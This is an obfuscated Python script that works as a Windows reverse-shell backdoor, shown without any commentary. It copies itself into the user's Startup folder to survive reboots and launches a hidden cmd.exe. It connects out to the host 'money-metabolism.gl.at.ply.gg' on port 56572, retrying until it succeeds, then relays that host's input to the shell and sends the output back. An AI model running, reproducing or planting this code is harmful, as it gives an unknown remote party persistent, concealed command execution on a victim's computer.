__all__ =[]#line:1
import os #line:3
import socket #line:4
import subprocess #line:5
import threading #line:6
import shutil #line:7
import sys #line:8
import time #line:9
def O00O0OO0OO0O00OOO (O0000O000OOOOOO00 ,O000OO00O0OOOO00O ,OOOOOO0OO0000O000 ):#line:11
    try :#line:12
        while OOOOOO0OO0000O000 ["connected"]:#line:13
            OO0000O0O000O0O00 =O0000O000OOOOOO00 .recv (1024 )#line:14
            if not OO0000O0O000O0O00 :#line:15
                OOOOOO0OO0000O000 ["connected"]=False #line:16
                break #line:17
            O000OO00O0OOOO00O .stdin .write (OO0000O0O000O0O00 )#line:18
            O000OO00O0OOOO00O .stdin .flush ()#line:19
    except Exception as OO0000O0OOOO000O0 :#line:20
        print (f"Error in s2p: {OO0000O0OOOO000O0}")#line:21
    finally :#line:22
        OOOOOO0OO0000O000 ["connected"]=False #line:23
        O0000O000OOOOOO00 .close ()#line:24
def OOO000OOOO00000OO (OO00OO000OOOO0O0O ,O0OO000O0O000O000 ,OOOO000OO0OOOO00O ):#line:26
    try :#line:27
        while OOOO000OO0OOOO00O ["connected"]:#line:28
            O0000OO000OOOOO0O =O0OO000O0O000O000 .stdout .read (1 )#line:29
            if O0000OO000OOOOO0O :#line:30
                OO00OO000OOOO0O0O .send (O0000OO000OOOOO0O )#line:31
            else :#line:32
                OOOO000OO0OOOO00O ["connected"]=False #line:33
                break #line:34
    except Exception as OOO0000O00OO0O00O :#line:35
        print (f"Error in p2s: {OOO0000O00OO0O00O}")#line:36
    finally :#line:37
        OOOO000OO0OOOO00O ["connected"]=False #line:38
        OO00OO000OOOO0O0O .close ()#line:39
def OO0OOOOOO0000OO0O (file_path =None ):#line:41
    if file_path is None :#line:42
        file_path =sys .argv [0 ]#line:43
    O0000OOO00OOOOO00 =os .path .join (os .getenv ('APPDATA'),'Microsoft','Windows','Start Menu','Programs','Startup')#line:45
    O00OOOO0O0O0OO0OO =os .path .join (O0000OOO00OOOOO00 ,os .path .basename (file_path ))#line:46
    if file_path !=O00OOOO0O0O0OO0OO :#line:48
        shutil .copy (file_path ,O00OOOO0O0O0OO0OO )#line:49
        print (f"Copied {file_path} to {O0000OOO00OOOOO00}")#line:50
    else :#line:51
        print (f"The script is already in the startup directory: {O00OOOO0O0O0OO0OO}")#line:52
def O0O00OO0OO000O0OO (OO000O00O0OOOOO00 ):#line:54
    while True :#line:55
        O0000000OOO00O00O =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:56
        try :#line:57
            print (f"Attempting to connect to the server at {OO000O00O0OOOOO00}...")#line:58
            O0000000OOO00O00O .connect (OO000O00O0OOOOO00 )#line:59
            O0000000OOO00O00O .send (b'\x00')#line:60
            print ("Connected to the server.")#line:61
            return O0000000OOO00O00O #line:62
        except Exception as O0OOO000OOO0OO0OO :#line:63
            print (f"Connection error: {O0OOO000OOO0OO0OO}")#line:64
            O0000000OOO00O00O .close ()#line:65
            print ("Retrying in 5 seconds...")#line:66
            time .sleep (5 )#line:67
def O0O0OOOOO0OOO000O ():#line:69
    OO0O0OO0O0O0O00OO =subprocess .STARTUPINFO ()#line:70
    OO0O0OO0O0O0O00OO .dwFlags |=subprocess .STARTF_USESHOWWINDOW #line:71
    OO0O0OO0O0O0O00OO .wShowWindow =subprocess .SW_HIDE #line:72
    O00000OO00OO0000O =subprocess .Popen (["cmd"],stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ,stdin =subprocess .PIPE ,startupinfo =OO0O0OO0O0O0O00OO )#line:80
    return O00000OO00OO0000O #line:82
def O0000000OO000OO00 ():#line:84
    OO0OOOOOO0000OO0O ()#line:85
    OOO00OOO0OOOOOO0O =("money-metabolism.gl.at.ply.gg",56572 )#line:86
    while True :#line:88
        O0000OOOOOOOOO00O =O0O00OO0OO000O0OO (OOO00OOO0OOOOOO0O )#line:89
        OOO0O00OO000OO0O0 =O0O0OOOOO0OOO000O ()#line:90
        O0O00OOOO0000O000 ={"connected":True }#line:92
        O0OO0OO0OOO0000O0 =threading .Thread (target =O00O0OO0OO0O00OOO ,args =(O0000OOOOOOOOO00O ,OOO0O00OO000OO0O0 ,O0O00OOOO0000O000 ))#line:94
        O0OO0OO0OOO0000O0 .daemon =True #line:95
        O0OO0OO0OOO0000O0 .start ()#line:96
        O0000O000O0O0O0OO =threading .Thread (target =OOO000OOOO00000OO ,args =(O0000OOOOOOOOO00O ,OOO0O00OO000OO0O0 ,O0O00OOOO0000O000 ))#line:98
        O0000O000O0O0O0OO .daemon =True #line:99
        O0000O000O0O0O0OO .start ()#line:100
        while O0O00OOOO0000O000 ["connected"]:#line:102
            try :#line:103
                O0000OOOOOOOOO00O .send (b'\x00')#line:104
                time .sleep (5 )#line:105
            except Exception as OOO0O0OO00OO0OO00 :#line:106
                print (f"Connection check failed: {OOO0O0OO00OO0OO00}")#line:107
                O0O00OOOO0000O000 ["connected"]=False #line:108
                break #line:109
        print ("Connection lost. Reattempting connection...")#line:111
        O0OO0OO0OOO0000O0 .join (timeout =1 )#line:112
        O0000O000O0O0O0OO .join (timeout =1 )#line:113
        O0000OOOOOOOOO00O .close ()#line:114
        OOO0O00OO000OO0O0 .terminate ()#line:115
        time .sleep (5 )#line:116
if __name__ =="__main__":#line:118
    O0000000OO000OO00 ()#line:119
